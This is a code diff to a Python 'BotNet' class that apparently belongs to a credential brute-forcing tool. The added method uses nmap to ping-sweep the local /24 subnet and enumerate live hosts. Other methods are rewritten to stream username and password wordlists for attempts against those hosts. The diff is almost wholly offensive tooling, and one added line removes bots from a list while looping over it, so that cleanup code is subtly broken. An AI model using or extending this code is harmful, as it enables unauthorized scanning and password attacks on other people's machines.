@@ -1,10 +1,11 @@
 import argparse
+import nmap
+import socket
 from threading import Thread
 from typing import Optional
 from termcolor import colored
 from src.entities.Bot import Bot
 from src.constants.logo import ascii_logo
-from src.utils.read_txt_files import read_text_file
 
 
 class BotNet:
@@ -33,14 +34,26 @@ class BotNet:
         self.pwd_src_path = args.pwd_src_path
 
 
-    def __get_passwords(self):
-        for password in read_text_file(self.pwd_src_path):
-            yield password
+    def __get_hosts(self):
+        host_name = socket.gethostname()
+        ip_address = socket.gethostbyname(host_name)
+        network_prefix = f"{ip_address.rsplit('.', 1)[0]}."
+        nm = nmap.PortScanner()
+        nm.scan(hosts=f"{network_prefix}1-255", arguments="-sn")
+        for host in nm.all_hosts():
+            yield host
 
 
     def __get_users(self):
-        for password in read_text_file(self.usr_src_path):
-            yield password
+        with open(self.usr_src_path) as users:
+            for u in users:
+                yield u.strip()
+
+
+    def __get_passwords(self):
+        with open(self.pwd_src_path) as passwords:
+            for p in passwords:
+                yield p.strip()
 
 
     def __set_bots(self, user: str):
@@ -61,6 +74,7 @@ class BotNet:
         for bot in self.__bots:
             try:
                 bot.disconnect()
+                self.__bots.remove(bot)
             except:
                 pass
 
